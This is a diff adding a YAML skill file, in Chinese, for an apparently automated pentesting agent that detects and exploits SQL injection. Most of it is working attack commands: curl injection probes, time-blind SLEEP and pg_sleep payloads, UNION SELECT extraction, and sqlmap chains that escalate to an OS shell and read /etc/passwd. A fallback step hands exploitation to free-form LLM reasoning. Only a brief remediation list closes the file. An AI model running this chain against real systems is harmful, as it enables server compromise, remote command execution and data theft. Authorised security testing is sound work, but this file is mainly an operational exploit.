@@ -1,0 +1,247 @@
+# ═══════════════════════════════════════════════════════════
+# SQL 注入综合利用
+#
+# 原理: 用户输入未经参数化直接拼接到 SQL 语句中
+# 覆盖: 联合注入、报错注入、布尔盲注、时间盲注、堆叠注入
+# 策略: sqlmap 自动化优先 → 手工验证 → LLM 兜底
+# ═══════════════════════════════════════════════════════════
+skill_id: sql_injection
+name: "SQL 注入检测与利用"
+category: web_inject
+version: "1.0"
+
+principle: |
+  SQL 注入的本质是应用将用户输入直接拼接到 SQL 语句中，导致攻击者
+  可以改变 SQL 语义，执行任意数据库操作。
+  
+  注入类型及利用方式:
+  1. 联合查询注入 (UNION): 最直接，可在响应中看到数据
+     - 前提: 注入点在 SELECT 语句中，且结果会显示在页面上
+     - 步骤: ORDER BY 确定列数 → UNION SELECT 提取数据
+  
+  2. 报错注入 (Error-based): 通过构造触发数据库错误的查询提取数据
+     - MySQL: extractvalue(), updatexml()
+     - MSSQL: convert(), cast()
+     - PostgreSQL: ::int 类型转换错误
+  
+  3. 布尔盲注 (Boolean-blind): 通过页面差异（有/无数据）逐字符提取
+     - 效率低但可靠，sqlmap 自动化处理
+  
+  4. 时间盲注 (Time-blind): 通过响应延迟判断条件真假
+     - MySQL: SLEEP(), BENCHMARK()
+     - PostgreSQL: pg_sleep()
+     - MSSQL: WAITFOR DELAY
+  
+  5. 堆叠查询 (Stacked): 分号分隔执行多条 SQL
+     - 可 INSERT/UPDATE/DELETE/EXEC
+     - PHP+MySQL 默认不支持（mysqli_query 不支持多语句）
+     - Python+PostgreSQL/MSSQL 通常支持
+  
+  数据库识别:
+  - MySQL: @@version, CONCAT(), SLEEP(), --+ 注释
+  - PostgreSQL: version(), pg_sleep(), -- 注释
+  - MSSQL: @@version, WAITFOR DELAY, -- 注释
+  - Oracle: DUAL 表, DBMS_PIPE.RECEIVE_MESSAGE
+  - SQLite: sqlite_version(), typeof()
+
+match:
+  rules:
+    - evidence_contains: ["sql injection", "sqli", "SQL Injection"]
+    - evidence_contains: ["sqlmap", "syntax error", "SQL syntax"]
+    - evidence_contains: ["mysql_fetch", "pg_query", "ORA-", "sqlite3"]
+    - fingerprint_contains: ["sql injection"]
+    - cve_matches: ["CVE-2022-34265"]  # Django SQL injection
+
+probes:
+  - id: confirm_sqli
+    description: "确认 SQL 注入存在并识别注入点"
+    steps:
+      # 从扫描证据中提取可能的注入参数和 URL
+      # 这里假设 VulnAgent/Nuclei 已经发现了注入点
+      # 探测阶段做更精确的确认
+      - command: |
+          # 简单的单引号测试（在发现的 URL 上）
+          # 注入点 URL 从 finding.target 传入
+          base_url="{ENDPOINT}"
+          
+          # 测试常见参数
+          for param in id user_id page uid name q; do
+            # 正常请求
+            normal=$(curl -s "${base_url}?${param}=1" --max-time 8 -o /dev/null -w "%{http_code}:%{size_download}")
+            # 单引号
+            sqli=$(curl -s "${base_url}?${param}=1'" --max-time 8 -o /dev/null -w "%{http_code}:%{size_download}")
+            # 双引号闭合
+            sqli2=$(curl -s "${base_url}?${param}=1'--+-" --max-time 8 -o /dev/null -w "%{http_code}:%{size_download}")
+            
+            normal_code=$(echo $normal | cut -d: -f1)
+            sqli_code=$(echo $sqli | cut -d: -f1)
+            sqli2_code=$(echo $sqli2 | cut -d: -f1)
+            
+            # 单引号报错但闭合后恢复 = 注入点
+            if [ "$normal_code" = "200" ] && [ "$sqli_code" = "500" ] && [ "$sqli2_code" = "200" ]; then
+              echo "SQLI_PARAM:${param}:error_based"
+            fi
+            # 单引号导致内容变化
+            if [ "$normal_code" = "$sqli_code" ] && [ "$(echo $normal | cut -d: -f2)" != "$(echo $sqli | cut -d: -f2)" ]; then
+              echo "SQLI_PARAM:${param}:content_diff"
+            fi
+          done
+        parse_rules:
+          - if_regex: "SQLI_PARAM:([^:]+):(\\w+)"
+            set: { sqli_confirmed: true }
+
+  - id: time_blind_confirm
+    description: "时间盲注确认（最可靠的检测方法）"
+    depends_on: { sqli_confirmed: true }
+    command: |
+      # 用 SLEEP 确认注入（MySQL）
+      start=$(date +%s)
+      curl -s "{ENDPOINT}?id=1' AND SLEEP(3)--+-" --max-time 10 > /dev/null 2>&1
+      elapsed=$(($(date +%s) - start))
+      if [ $elapsed -ge 3 ]; then
+        echo "TIME_BLIND_MYSQL:${elapsed}s"
+      fi
+      # PostgreSQL
+      start=$(date +%s)
+      curl -s "{ENDPOINT}?id=1' AND pg_sleep(3)--" --max-time 10 > /dev/null 2>&1
+      elapsed2=$(($(date +%s) - start))
+      if [ $elapsed2 -ge 3 ]; then
+        echo "TIME_BLIND_PGSQL:${elapsed2}s"
+      fi
+    parse_rules:
+      - if_contains: ["TIME_BLIND_MYSQL"]
+        set: { db_type: "mysql", time_blind: true }
+      - if_contains: ["TIME_BLIND_PGSQL"]
+        set: { db_type: "postgresql", time_blind: true }
+
+exploit_paths:
+  # ═══ 路径 A: sqlmap 自动化（最优先）═══
+  - path_id: sqlmap_auto
+    name: "sqlmap 自动化注入利用"
+    priority: 1
+    principle: |
+      sqlmap 是最成熟的 SQL 注入自动化工具，支持所有注入类型和
+      大部分数据库。先用 --batch --dbs 获取数据库列表确认 RCE 能力，
+      再尝试 --os-shell 获取系统命令执行。
+    conditions:
+      sqli_confirmed: true
+    steps:
+      - id: sqlmap_detect
+        description: "sqlmap 自动检测注入类型并提取数据库信息"
+        command: |
+          sqlmap -u "{ENDPOINT}?id=1" \
+            --batch --random-agent \
+            --technique=BEUSTQ \
+            --dbs \
+            --threads=4 \
+            --timeout=15 \
+            --retries=2 \
+            --level=3 --risk=2 \
+            2>&1 | tail -50
+        timeout: 180
+        success_criteria:
+          stdout_contains_any: ["available databases", "fetched data logged", "information_schema"]
+        on_success: sqlmap_os_shell
+        on_fail: sqlmap_forms
+
+      - id: sqlmap_forms
+        description: "sqlmap 测试 POST 表单参数"
+        command: |
+          sqlmap -u "{ENDPOINT}" \
+            --forms --batch --random-agent \
+            --dbs \
+            --threads=4 \
+            --level=3 --risk=2 \
+            2>&1 | tail -50
+        timeout: 180
+        success_criteria:
+          stdout_contains_any: ["available databases", "fetched data logged"]
+        on_success: sqlmap_os_shell
+        on_fail: next_path
+
+      - id: sqlmap_os_shell
+        description: "尝试 sqlmap --os-shell 获取系统命令执行"
+        command: |
+          echo -e "id\nwhoami\nexit" | sqlmap -u "{ENDPOINT}?id=1" \
+            --batch --random-agent \
+            --os-shell \
+            --threads=4 \
+            2>&1 | tail -30
+        timeout: 120
+        success_criteria:
+          stdout_contains_any: ["uid=", "www-data", "root", "os-shell"]
+        on_success: conclude_success
+        on_fail: sqlmap_file_read
+        evidence_capture:
+          shell_type: "rce_sqlmap_shell"
+
+      - id: sqlmap_file_read
+        description: "sqlmap 文件读取（/etc/passwd）作为利用证明"
+        command: |
+          sqlmap -u "{ENDPOINT}?id=1" \
+            --batch --random-agent \
+            --file-read="/etc/passwd" \
+            2>&1 | tail -20
+        timeout: 120
+        success_criteria:
+          stdout_contains_any: ["root:", "/etc/passwd"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "file_read_sqli"
+
+  # ═══ 路径 B: 手工 UNION 注入 ═══
+  - path_id: manual_union
+    name: "手工 UNION 联合查询注入"
+    priority: 2
+    principle: |
+      当 sqlmap 失败时（WAF、非标准注入点等），手工构造 payload。
+      先用 ORDER BY 确定列数，再用 UNION SELECT 提取数据。
+    conditions:
+      sqli_confirmed: true
+    steps:
+      - id: union_columns
+        description: "ORDER BY 确定查询列数"
+        command: |
+          for n in $(seq 1 20); do
+            code=$(curl -s -o /dev/null -w "%{http_code}" \
+              "{ENDPOINT}?id=1' ORDER BY ${n}--+-" --max-time 8)
+            if [ "$code" != "200" ]; then
+              echo "COLUMNS:$((n-1))"
+              break
+            fi
+          done
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["COLUMNS:"]
+        on_success: union_extract
+        on_fail: next_path
+
+      - id: union_extract
+        description: "UNION SELECT 提取数据库版本和用户"
+        command: |
+          # 假设 3 列（实际从上一步结果获取）
+          curl -s "{ENDPOINT}?id=-1' UNION SELECT 1,concat(user(),0x7c,version(),0x7c,database()),3--+-" --max-time 10
+        timeout: 15
+        success_criteria:
+          stdout_contains_any: ["|", "MariaDB", "mysql", "PostgreSQL"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "sqli_union"
+
+  # ═══ 路径 C: LLM 兜底 ═══
+  - path_id: llm_freeform
+    name: "LLM 自由推理"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+    conditions:
+      sqli_confirmed: true
+
+remediation: |
+  1. 使用参数化查询（PreparedStatement / 绑定变量），绝不拼接 SQL
+  2. 使用 ORM 框架（SQLAlchemy、Hibernate、Django ORM）
+  3. 实施输入验证（白名单）和输出编码
+  4. 数据库用户最小权限原则（不给 FILE、EXECUTE 权限）
+  5. 启用 WAF 的 SQL 注入防护规则
